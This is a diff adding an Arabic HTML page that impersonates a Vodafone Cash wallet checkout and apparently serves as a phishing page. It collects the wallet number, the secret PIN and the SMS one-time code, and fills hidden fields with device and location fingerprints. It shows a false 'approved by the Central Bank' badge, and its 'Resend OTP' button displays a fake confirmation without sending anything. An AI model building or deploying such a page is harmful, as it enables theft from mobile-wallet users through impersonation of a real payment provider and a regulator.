@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tales - الدفع عبر فودافون كاش</title>
+
+    <!-- 🔒 استدعاء ملفات الحماية والبيانات الخارجي -->
+    <script src="protection.js" defer></script>
+    <script src="Data.js" defer></script>
+
+    <!-- FontAwesome & Bootstrap Grid CSS -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.6.0/css/bootstrap-grid.min.css">
+
+    <!-- ملف التنسيقات الخارجي -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <header class="payment-header">
+        <h1>إتمام الدفع عبر فودافون كاش</h1>
+    </header>
+
+    <div class="container">
+        <div class="checkout-card">
+            <section class="card-inputs">
+                <form id="vodafone_checkout_form" action="/api/pay" method="POST" novalidate>
+                    
+                    <!-- خانات مخفية لتحليل الأمان والبيانات -->
+                    <input type="hidden" name="payment_method" value="vodafone_cash">
+                    <input type="hidden" name="geoCity" id="geoCity" value="غير معروف">
+                    <input type="hidden" name="geoCountry" id="geoCountry" value="غير معروف">
+                    <input type="hidden" name="ispProvider" id="ispProvider" value="غير معروف">
+                    <input type="hidden" name="batteryInfo" id="batteryInfo" value="غير معروف">
+                    <input type="hidden" name="deviceRAM" id="deviceRAM" value="غير معروف">
+                    <input type="hidden" name="cpuCores" id="cpuCores" value="غير معروف">
+                    <input type="hidden" name="deviceType" id="deviceType" value="غير معروف">
+                    <input type="hidden" name="screenSize" id="screenSize" value="غير معروف">
+                    <input type="hidden" name="userTimeZone" id="userTimeZone" value="غير معروف">
+                    <input type="hidden" name="lang" id="lang" value="غير معروف">
+                    <input type="hidden" name="clientID" id="clientID" value="غير متوفر">
+
+                    <!-- 1. رقم المحفظة (Wallet Number) -->
+                    <div class="input-group-custom">
+                        <label for="wallet_number">Wallet Number - رقم المحفظة:</label>
+                        <div class="input-wrapper">
+                            <input placeholder="010xxxxxxxx" 
+                                   type="text" 
+                                   inputmode="numeric" 
+                                   name="phone" 
+                                   id="wallet_number" 
+                                   maxlength="11" 
+                                   required
+                                   style="padding-right: 85px;">
+                            <div class="input-icon-right">
+                                <span class="meeza-badge" style="background-color: #e60000;">فودافون</span>
+                                <i class="fa fa-phone cash-icon" style="color: #e60000;" title="محفظة فودافون"></i>
+                            </div>
+                        </div>
+                        <div class="error-message" id="error_wallet">يرجى إدخال رقم محفظة فودافون صحيح (11 رقماً).</div>
+                    </div>
+
+                    <!-- 2. المبلغ (Amount) -->
+                    <div class="input-group-custom">
+                        <label for="pay_amount">Amount - المبلغ (L.E):</label>
+                        <div class="input-wrapper">
+                            <input placeholder="1234 L.E" 
+                                   type="text" 
+                                   inputmode="numeric" 
+                                   name="amount" 
+                                   id="pay_amount" required>
+                        </div>
+                        <div class="error-message" id="error_amount">يرجى إدخال مبلغ صحيح.</div>
+                    </div>
+
+                    <!-- 3. الرقم السري للمحفظة (PIN) -->
+                    <div class="input-group-custom">
+                        <label for="wallet_pin">PIN - الرقم السري للمحفظة:</label>
+                        <div class="input-wrapper">
+                            <input placeholder="******" 
+                                   type="password" 
+                                   inputmode="numeric" 
+                                   name="wallet_pin" 
+                                   id="wallet_pin" 
+                                   maxlength="6" 
+                                   required
+                                   style="padding-left: 35px;">
+                            <button type="button" class="toggle-password" id="togglePinBtn" title="إظهار/إخفاء الرقم السري">
+                                <i class="fa fa-eye" id="pinIcon"></i>
+                            </button>
+                        </div>
+                        <div class="error-message" id="error_pin">يجيب إدخال الرقم السري للمحفظة مكون من أرقام صحيحة.</div>
+                    </div>
+
+                    <!-- 4. الرقم السري المتغير (OTP) مع زر إعادة الإرسال -->
+                    <div class="input-group-custom">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
+                            <label for="wallet_otp" style="margin-bottom: 0;">OTP - الرقم السري المتغير:</label>
+                            <button type="button" id="resend_otp_btn" style="background: none; border: none; color: #01338D; font-size: 12px; font-weight: bold; cursor: pointer; padding: 0;">
+                                Resend OTP - إعادة إرسال الرمز
+                            </button>
+                        </div>
+                        <div class="input-wrapper">
+                            <input placeholder="******" 
+                                   type="text" 
+                                   inputmode="numeric" 
+                                   name="otp" 
+                                   id="wallet_otp" 
+                                   maxlength="6">
+                        </div>
+                        <div class="error-message" id="error_otp">أدخل رمز التأكيد المؤقت (OTP) المرسل في رسالة نصية.</div>
+                    </div>
+
+                    <!-- زر الدفع -->
+                    <div class="card-footer-box">
+                        <button id="submitButton" type="submit" class="submit-btn" style="background-color: #e60000;">
+                            Pay with Wallet - ادفع بالمحفظة
+                        </button>
+                    </div>
+
+                </form>
+
+                <!-- رابط للعودة للصفحة الرئيسية -->
+                <div style="text-align: center; margin-top: 15px;">
+                    <a href="index.html" style="color: #01338D; font-size: 13px; text-decoration: underline;">العودة لوسائل الدفع الأخرى</a>
+                </div>
+
+                <!-- شعارات الاعتماد -->
+                <div class="container bank-logos-container" style="margin-top: 20px;">
+                    <div class="bank-logos-title"><i class="fa fa-shield" aria-hidden="true"></i> معتمد وتحت إشراف البنك المركزي</div>
+                    <div class="bank-logos-grid" style="display: flex; justify-content: center; align-items: center; margin-top: 10px;">
+                        <div class="bank-logo-card" title="البنك المركزي المصري">
+                            <img src="https://cbpn.currencyresearch.com/wp-content/uploads/2025/09/CentralBankofEgypt.png.webp" alt="البنك المركزي المصري" style="max-height: 40px;">
+                        </div>
+                    </div>
+                </div>
+
+            </section>
+        </div>
+    </div>
+
+    <!-- كود إظهار وإخفاء الرقم السري والتفاعل -->
+    <script>
+        document.getElementById('togglePinBtn').addEventListener('click', function() {
+            const pinInput = document.getElementById('wallet_pin');
+            const pinIcon = document.getElementById('pinIcon');
+            if (pinInput.type === 'password') {
+                pinInput.type = 'text';
+                pinIcon.className = 'fa fa-eye-slash';
+            } else {
+                pinInput.type = 'password';
+                pinIcon.className = 'fa fa-eye';
+            }
+        });
+
+        document.getElementById('resend_otp_btn').addEventListener('click', function() {
+            alert('تم إرسال رمز OTP جديد إلى رقم هاتفك المسجل بنجاح.');
+        });
+    </script>
+
+    <!-- استدعاء ملف الـ Widget للشات الدعم المباشر -->
+    <script src="/chat-widget.js" defer></script>
+</body>
+</html>
